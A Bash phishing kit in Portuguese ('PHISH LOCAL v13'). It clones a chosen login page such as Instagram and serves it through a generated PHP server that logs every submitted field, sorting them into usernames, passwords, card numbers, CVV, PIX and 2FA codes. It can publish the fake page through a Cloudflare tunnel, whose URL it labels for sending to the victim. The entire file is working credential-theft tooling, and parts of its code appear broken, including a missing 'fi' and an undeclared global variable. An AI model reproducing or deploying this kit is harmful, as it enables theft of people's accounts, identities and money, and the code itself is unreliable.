#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v13 - Menu Loop + PHP Server
# Captura QUALQUER campo | Volta ao menu sempre
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"
PORT=8080

# Função pra mostrar menu
show_menu() {
    clear
    echo ""
    echo "=========================================="
    echo "  🎣 PHISH LOCAL v13"
    echo "=========================================="
    echo ""
    echo "  1) Criar phishing"
    echo "  2) Ver capturas"
    echo "  3) Limpar capturas"
    echo "  4) Sair"
    echo ""
    echo -n "Escolha: "
}

# Loop principal
while true; do
    show_menu
    read CHOICE

    case "$CHOICE" in
    1)
        echo ""
        echo -n "URL do site (ex: https://instagram.com): "
        read URL
        URL=$(echo "$URL" | tr -d '\r\n' | xargs)
        [ -z "$URL" ] && URL="https://instagram.com"
        if ! echo "$URL" | grep -qE '^https?://'; then
            URL="https://$URL"
        fi
        DOMAIN=$(echo "$URL" | sed -E 's|https?://||;s|/.*||')
        echo ""
        echo "[!] Alvo: $URL"

        echo ""
        echo -n "URL local (ex: instagram.com): "
        read CUSTOM_URL
        CUSTOM_URL=$(echo "$CUSTOM_URL" | tr -d '\r\n' | xargs | sed 's|https?://||;s|/.*||;s|[^a-zA-Z0-9.-]|-|g')
        [ -z "$CUSTOM_URL" ] && CUSTOM_URL="login"
        echo "[!] URL local: https://${CUSTOM_URL}"

        echo ""
        echo -n "Redirecionar para (ex: https://instagram.com): "
        read REDIRECT_URL
        REDIRECT_URL=$(echo "$REDIRECT_URL" | tr -d '\r\n' | xargs)
        [ -z "$REDIRECT_URL" ] && REDIRECT_URL="https://instagram.com"
        if ! echo "$REDIRECT_URL" | grep -qE '^https?://'; then
            REDIRECT_URL="https://$REDIRECT_URL"
        fi
        echo "[!] Redirect: $REDIRECT_URL"

        # --- CLONAR SITE ---
        echo ""
        echo "[...] Clonando site..."
        rm -rf "$SITE_DIR"
        mkdir -p "$SITE_DIR"

        USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

        curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null

        # Baixar recursos
        grep -oE 'url\([^)]+\)' "$SITE_DIR/index.html" 2>/dev/null | head -50 > /tmp/resources.txt
        grep -oE '(href|src)=["'"'"'][^"'"'"']*\.(css|png|jpg|jpeg|gif|svg|ico|webp|woff2?|ttf|mp4|webm)["'"'"']' "$SITE_DIR/index.html" | sed -E 's/.*=["'"'"']//; s/["'"'"']$//' >> /tmp/resources.txt

        sort -u /tmp/resources.txt | while read -r res; do
            res=$(echo "$res" | tr -d "'\"" | sed 's/^url(//;s/)$//')
            echo "$res" | grep -qE '^(data:|#|javascript:)' && continue
            if echo "$res" | grep -qE '^//'; then
                res="https:$res"
            elif echo "$res" | grep -qvE '^https?://'; then
                if echo "$res" | grep -qE '^/'; then
                    res="${URL%/}$res"
                else
                    res="${URL%/}/$res"
                fi
            fi
            fname=$(basename "$res" | sed 's/[^a-zA-Z0-9._-]/_/g' | sed 's/__*/_/g')
            [[ "$fname" =~ ^index\.html ]] && continue
            curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/$fname" "$res" 2>/dev/null
        done

        if [ ! -s "$SITE_DIR/index.html" ] || [ $(wc -c < "$SITE_DIR/index.html") -lt 100 ]; then
            echo "[!] Nao foi possivel clonar. Usando fallback."
            cat > "$SITE_DIR/index.html" << 'EOF'
<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}h1{font-size:44px;font-weight:300;margin-bottom:30px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}input:focus{border-color:#a8a8a8}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}button:active{background:#1877f2}</style>
</head><body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Usuario ou email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body></html>
EOF
        fi

        sed -i 's/<form/<form method="POST">/gi' "$SITE_DIR/index.html" 2>/dev/null
        sed -i 's/action="[^"]*"/action=""/gi' "$SITE_DIR/index.html" 2>/dev/null

        echo "[OK] Site clonado! Recursos: $(ls "$SITE_DIR" | wc -l) arquivos"

        # --- PEGAR IP ---
        IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
        [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
        [ -z "$IP" ] && IP="127.0.0.1"

        # --- CLOUDFLARE (OPCIONAL) ---
        CF_INSTALLED=false
        if command -v cloudflared &>/dev/null; then
            CF_INSTALLED=true
        fi

        echo ""
        echo "=========================================="
        echo "  CLOUDFLARE TUNNEL (Opcional)"
        echo "=========================================="
        echo ""

        if [ "$CF_INSTALLED" = true ]; then
            echo "[OK] Cloudflared instalado!"
            echo ""
            echo "  1) Usar Cloudflare Tunnel"
            echo "  2) Usar so IP local ($IP:$PORT)"
            echo ""
            echo -n "Escolha: "
            read CF_CHOICE
        else
            echo "Cloudflared nao instalado."
            echo ""
            echo "  1) Usar so IP local ($IP:$PORT)"
            echo "  2) Instalar cloudflared"
            echo ""
            echo -n "Escolha: "
            read CF_CHOICE

            if [ "$CF_CHOICE" = "2" ]; then
                echo "[...] Instalando cloudflared..."
                pkg install cloudflared -y 2>/dev/null
                if command -v cloudflared &>/dev/null; then
                    CF_INSTALLED=true
                    CF_CHOICE=1
                    echo "[OK] Instalado!"
                else
                    echo "[ERRO] Falha. Usando IP local."
                    CF_CHOICE=1
                fi
            else
                CF_CHOICE=2
            fi
        fi

        # --- CRIAR SERVIDOR PHP ---
        cat > server.php << PHPEOF
<?php
\$WORDLIST = ["login","signin","sign_in","log_in","entrar","acessar","iniciar","cadastrar","registrar","username","user","email","e-mail","telefone","phone","cpf","cnpj","matricula","identifier","userid","password","senha","pass","passwd","pwd","palavra","chave","secret","pin","codigo","nome","name","fullname","firstname","lastname","sobrenome","social_name","razao_social","mae","pai","data","date","nascimento","birth","birthdate","ano","mes","dia","endereco","rua","avenida","address","street","cep","zip","zipcode","bairro","cidade","pais","country","complemento","empresa","company","trabalho","profissao","escola","universidade","curso","departamento","cargo","cartao","card","credit_card","cvv","validade","conta","banco","agencia","pix","token","otp","verification","captcha","2fa","auth","pergunta","resposta","termos","terms","privacidade","privacy","aceitar","remember","newsletter"];
\$REDIRECT = "$REDIRECT_URL";
\$LOG_FILE = "capturas.txt";
\$SITE_DIR = "site_clone";

function classifyField(\$name) {
    \$name = strtolower(preg_replace('/[^a-z0-9_]/', '', \$name));
    foreach (\$WORDLIST as \$w) {
        if (strpos(\$name, \$w) !== false || strpos(\$w, \$name) !== false) {
            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', \$w)) return 'USUARIO';
            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', \$w)) return 'SENHA';
            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', \$w)) return 'NOME';
            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', \$w)) return 'DATA';
            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', \$w)) return 'ENDERECO';
            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', \$w)) return 'ESCOLA_TRABALHO';
            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', \$w)) return 'PAGAMENTO';
            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', \$w)) return 'SEGURANCA';
            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', \$w)) return 'PREFERENCIA';
            return 'EXTRA';
        }
    }
    return 'OUTRO';
}

\$_SERVER['REQUEST_URI'] = parse_url(\$_SERVER['REQUEST_URI'], PHP_URL_PATH);
\$uri = \$_SERVER['REQUEST_URI'];

if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$ip = \$_SERVER['HTTP_X_FORWARDED_FOR'] ?? \$_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    \$timestamp = date('Y-m-d H:i:s');
    \$classified = array('USUARIO'=>array(),'SENHA'=>array(),'NOME'=>array(),'DATA'=>array(),'ENDERECO'=>array(),'ESCOLA_TRABALHO'=>array(),'PAGAMENTO'=>array(),'SEGURANCA'=>array(),'PREFERENCIA'=>array(),'EXTRA'=>array(),'OUTRO'=>array());
    foreach (\$_POST as \$k => \$v) {
        \$cat = classifyField(\$k);
        \$classified[\$cat][] = "\$k: \$v";
    }
    \$log = json_encode(array('timestamp'=>\$timestamp,'ip'=>\$ip,'fields'=>\$_POST,'classified'=>\$classified))."\n";
    file_put_contents(\$LOG_FILE, \$log, FILE_APPEND);
    header("Location: \$REDIRECT");
    exit;
}

if (\$uri === '/' || \$uri === '') \$uri = '/index.html';
\$path = realpath(\$SITE_DIR . \$uri);
if (\$path && strpos(\$path, realpath(\$SITE_DIR)) === 0 && is_file(\$path)) {
    \$ext = strtolower(pathinfo(\$path, PATHINFO_EXTENSION));
    \$mime = array('html'=>'text/html','css'=>'text/css','js'=>'application/javascript','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','webp'=>'image/webp','woff'=>'font/woff','woff2'=>'font/woff2');
    header('Content-Type: '.(\$mime[\$ext]??'application/octet-stream'));
    readfile(\$path);
    exit;
}

header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}h1{font-size:44px;font-weight:300;margin-bottom:30px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}</style>
</head><body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Usuario ou email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body></html>
PHPEOF

        # --- INICIAR SERVIDOR ---
        echo ""
        echo "[*] Iniciando servidor PHP..."
        echo ""

        php -S 0.0.0.0:$PORT > /tmp/php.log 2>&1 &
        SERVER_PID=$!
        sleep 2

        # --- CLOUDFLARE TUNNEL ---
        CF_URL=""
        if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ] && command -v cloudflared &>/dev/null; then
            echo ""
            echo "[...] Criando tunnel... aguarde..."
            echo ""

            if [ "$IP" != "127.0.0.1" ] && [ -n "$IP" ]; then
                CF_TARGET="http://${IP}:$PORT"
            else
                CF_TARGET="http://localhost:$PORT"
            fi

            cloudflared tunnel --url "$CF_TARGET" > /tmp/cf_tunnel.log 2>&1 &
            CF_PID=$!

            for i in $(seq 1 20); do
                sleep 1
                CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
                if [ -n "$CF_URL" ]; then
                    break
                fi
            done

            if [ -n "$CF_URL" ]; then
                echo "[OK] Tunnel criado!"
            else
                echo "[AVISO] Tunnel nao gerou URL em 20s."
                head -5 /tmp/cf_tunnel.log
            fi
        fi

        # --- MOSTRAR RESULTADO ---
        clear
        echo ""
        echo "=========================================="
        echo "         SERVIDOR PRONTO!"
        echo "=========================================="
        echo ""
        if [ -n "$CF_URL" ]; then
            echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
            echo ""
            echo "    ${CF_URL}"
            echo ""
            echo "  Funciona de QUALQUER lugar do mundo!"
        else
            echo "  Acesse de qualquer dispositivo"
            echo "  na mesma rede Wi-Fi:"
            echo ""
            echo "  🔥 http://${CUSTOM_URL}:${PORT}"
            echo "    (ou http://${IP}:${PORT})"
        fi
        echo ""
        echo "  Parar: Ctrl+C (volta ao menu)"
        echo ""
        echo "=========================================="
        echo ""

        # --- MOSTRAR CAPTURAS EM TEMPO REAL + VOLTA AO MENU ---
        if [ -f "$LOG_FILE" ]; then
            tail -f "$LOG_FILE" &
            TAIL_PID=$!
        else
            TAIL_PID=""
        trap 'kill $SERVER_PID $TAIL_PID 2>/dev/null; wait $SERVER_PID $TAIL_PID 2>/dev/null; echo ""; echo "[OK] Servidor parado!"; sleep 1; break' INT TERM
        wait $SERVER_PID
        kill $TAIL_PID 2>/dev/null
        wait $TAIL_PID 2>/dev/null

        echo ""
        echo "[OK] Servidor parado! Voltando ao menu..."
        sleep 1
        ;;

    2)
        clear
        echo ""
        echo "=========================================="
        echo "  CAPTURAS"
        echo "=========================================="
        echo ""
        if [ -f "$LOG_FILE" ]; then
            cat "$LOG_FILE"
        else
            echo "Nenhuma captura ainda."
        fi
        echo ""
        echo "Pressione ENTER para voltar ao menu..."
        read
        ;;

    3)
        > "$LOG_FILE"
        echo "[OK] Capturas limpas!"
        echo ""
        echo "Pressione ENTER para voltar ao menu..."
        read
        ;;

    4)
        echo "Saindo..."
        exit 0
        ;;

    *)
        echo "Opcao invalida!"
        sleep 1
        ;;
    esac
done
